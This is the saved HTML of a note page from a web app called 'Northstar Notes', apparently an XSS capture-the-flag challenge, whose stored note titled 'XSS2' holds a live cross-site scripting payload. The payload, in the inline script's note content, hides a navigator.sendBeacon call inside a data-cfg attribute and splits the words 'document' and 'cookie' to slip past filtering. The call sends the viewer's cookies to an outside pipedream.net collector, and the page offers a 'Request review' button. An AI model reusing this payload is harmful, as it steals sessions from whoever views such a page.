            "text": "<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n  <meta charset=\"UTF-8\">\r\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n  <title>XSS2 — Northstar Notes</title>\r\n  <link rel=\"stylesheet\" href=\"/css/challenge-style.css\">\r\n</head>\r\n<body>\r\n\r\n  <header class=\"topbar\">\r\n    <nav>\r\n      <a href=\"/\" class=\"brand\">\r\n        <svg class=\"brand-icon\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2.5\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><path d=\"M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71\"/><path d=\"M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71\"/></svg>\r\n        Northstar Notes\r\n      </a>\r\n      <div class=\"nav-actions\">\r\n        <a href=\"/\" class=\"nav-link\">Library</a>\r\n        <a href=\"/#create\" class=\"nav-link\">Compose</a>\r\n      </div>\r\n    </nav>\r\n  </header>\r\n\r\n  <main class=\"note-main\">\r\n\r\n    <article class=\"note-article\">\r\n      <div class=\"note-head\">\r\n        <div class=\"note-head-meta\">\r\n          <span class=\"note-head-author\">anonymous</span>\r\n          <span class=\"dot\">&bull;</span>\r\n          <time>Apr 21, 2026</time>\r\n        </div>\r\n        <h1>XSS2</h1>\r\n        <div class=\"view-switcher\" aria-label=\"Layout variants\">\r\n          <a href=\"/note/e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f/summary\" class=\"view-pill view-pill-active\">Summary</a>\r\n          <a href=\"/note/e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f/print\" class=\"view-pill \">Print</a>\r\n          <a href=\"/note/e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f/compact\" class=\"view-pill \">Compact</a>\r\n        </div>\r\n      </div>\r\n      <div id=\"note-display\" class=\"note-body\">\r\n        <div class=\"note-loading\"><div class=\"spinner\"></div> Rendering&hellip;</div>\r\n      </div>\r\n    </article>\r\n\r\n    <div class=\"note-actions\">\r\n      <a href=\"/\" class=\"btn btn-ghost btn-sm\">&larr; Back to library</a>\r\n      <button id=\"report-btn\" class=\"btn btn-danger btn-sm\" data-note-id=\"e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f\">\r\n        <svg viewBox=\"0 0 24 24\" width=\"14\" height=\"14\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><path d=\"M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z\"/><line x1=\"4\" y1=\"22\" x2=\"4\" y2=\"15\"/></svg>\r\n        Request review\r\n      </button>\r\n    </div>\r\n    <div id=\"report-result\"></div>\r\n\r\n  </main>\r\n\r\n  <footer>\r\n    <p>Northstar Notes &copy; 2026</p>\r\n  </footer>\r\n\r\n  <script nonce=\"ihPyj1x1VLcyOO9dD8GeRg==\">\r\n    window.__APP_INIT__     = {\"theme\":\"dark\",\"panel\":\"summary\",\"noteId\":\"e6007144403f17fbf9b4c96a2450f815fe660d12827e5c92c63ebc92da6e898f\"};\r\n    window.__NOTE_CONTENT__ = \"\\u003cdiv id=\\\"enhance-config\\\" data-types=\\\"custom\\\">\\u003c/div>\\u003cdiv data-enhance=\\\"custom\\\" data-cfg=\\\"navigator.sendBeacon('https://eoi9a5fbdoq0l13.m.pipedream.net',top['doc'+'ument']['coo'+'kie'])\\\">\\u003c/div>\";\r\n  </script>\r\n  <script nonce=\"ihPyj1x1VLcyOO9dD8GeRg==\" src=\"/js/vendor/purify.min.js\"></script>\r\n  <script nonce=\"ihPyj1x1VLcyOO9dD8GeRg==\" src=\"/js/app.js\"></script>\r\n</body>\r\n</html>\r\n"
